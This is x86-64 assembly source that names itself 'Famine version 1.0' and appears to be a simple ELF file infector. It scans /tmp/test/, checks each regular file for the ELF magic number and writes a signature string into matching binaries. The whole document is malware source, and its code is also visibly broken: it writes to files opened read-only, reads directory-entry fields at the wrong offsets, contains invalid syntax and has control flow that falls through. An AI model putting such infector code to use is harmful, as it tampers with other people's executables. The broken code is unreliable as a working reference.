section .data
    directory db "/tmp/test/", 0
    signature db "Famine version 1.0 (c)oded by rstride", 0
    signature_length equ $ - signature

section .bss
    dirfd resb 4                ; File descriptor for the directory
    filefd resb 4               ; File descriptor for the file
    elf_header resb 4           ; ELF header buffer
    buffer resb 1024            ; Buffer for directory reading

section .text
    global _start

_start:
    ; Open the directory
    mov rax, 2                  ; Syscall for 'open'
    mov rdi, directory          ; Directory path
    xor rsi, rsi                ; Flags: read-only
    syscall                     ; Make the syscall
    mov [dirfd], rax            ; Store the directory file descriptor

    ; Check if the directory was opened successfully
    cmp rax, 0
    js _exit                    ; If less than 0, exit (error)

    ; Read directory contents
    mov rax, 78                 ; Syscall for 'getdents64'
    mov rdi, [dirfd]            ; Directory file descriptor
    mov rsi, buffer             ; Buffer to store directory entries
    mov rdx, 1024               ; Size of the buffer
    syscall                     ; Make the syscall

    ; Check if the read was successful
    cmp rax, 0
    jle _exit                   ; If less than or equal to 0, exit (error or end of directory)

    ; Process directory entries
    mov rbx, buffer             ; Pointer to the buffer
process_entry:
    ; Get the inode number (first 8 bytes)
    mov rdi, [rbx]
    ; Get the offset to the next entry (next 8 bytes)
    mov rsi, [rbx + 8]
    ; Get the length of the entry name (next 2 bytes)
    movzx rdx, word [rbx + 18]
    ; Get the entry name (starting at offset 19)
    lea rdi, [rbx + 19]

    ; Check if the entry is a regular file (DT_REG = 8)
    cmp byte [rbx + 17], 8
    jne next_entry

    ; Open the file
    mov rax, 2                  ; Syscall for 'open'
    mov rdi, rbx + 19           ; File name
    xor rsi, rsi                ; Flags: read-only
    syscall                     ; Make the syscall
    mov [filefd], rax           ; Store the file descriptor

    ; Check if the file was opened successfully
    cmp rax, 0
    js next_entry               ; If less than 0, skip to the next entry

    ; Check if the file is an ELF binary
    call check_elf

    ; Close the file
    mov rax, 3                  ; Syscall for 'close'
    mov rdi, [filefd]           ; File descriptor
    syscall

next_entry:
    ; Move to the next directory entry
    add rbx, rsi
    cmp rbx, buffer + rax
    jb process_entry

check_elf:
    ; Read the first 4 bytes (magic number) of the file to elf_header
    mov rax, 0                  ; Syscall for 'read'
    mov rdi, [filefd]            ; File descriptor
    mov rsi, elf_header          ; Buffer for ELF header
    mov rdx, 4                   ; Read 4 bytes
    syscall                      ; Perform the read

    ; Check the ELF magic number (0x7F 'E' 'L' 'F')
    mov eax, dword [elf_header]  ; Load the first 4 bytes into eax
    cmp eax, 0x464C457F          ; Compare with ELF magic number
    jne skip_file                ; If not ELF, skip the file

inject_signature:
    ; Write the signature at the end of the file
    mov rax, 1                  ; Syscall for 'write'
    mov rdi, [filefd]            ; File descriptor for the binary
    mov rsi, signature           ; Signature string
    mov rdx, signature_length    ; Length of the signature
    syscall                      ; Perform the write

_exit:
    mov rax, 60                 ; Syscall for 'exit'
    xor rdi, rdi                ; Exit code 0
    syscall
